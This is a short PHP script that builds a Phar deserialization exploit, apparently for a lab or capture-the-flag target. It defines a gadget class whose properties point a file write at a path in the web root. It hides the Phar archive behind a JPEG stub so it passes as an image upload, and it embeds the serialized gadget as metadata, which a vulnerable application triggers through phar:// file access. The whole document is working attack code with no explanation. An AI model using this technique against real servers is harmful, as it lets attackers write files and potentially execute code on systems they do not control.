<?php
    //create the POP Chain

    class LogFile
    {
        public function  __construct(){
            $this->filename = '/var/www/html/DTATTT/toandang.txt';
            $this->fcontents = 'toandang dep trai';
        }
    }

    //create the Phar Archive
    $phar = new Phar("test.phar");
    $phar->startbuffering();
    $phar->setStub(file_get_contents('meme.jpg') . "<?php __HALT_COMPILER(); ?>");

    //Begin of serialzation
    $payload = new LogFile();
    $phar->setMetadata($payload);

    //zip file within the Phar Archive
    $phar->addFromString("test.txt", "test");
    $phar->stopBuffering();
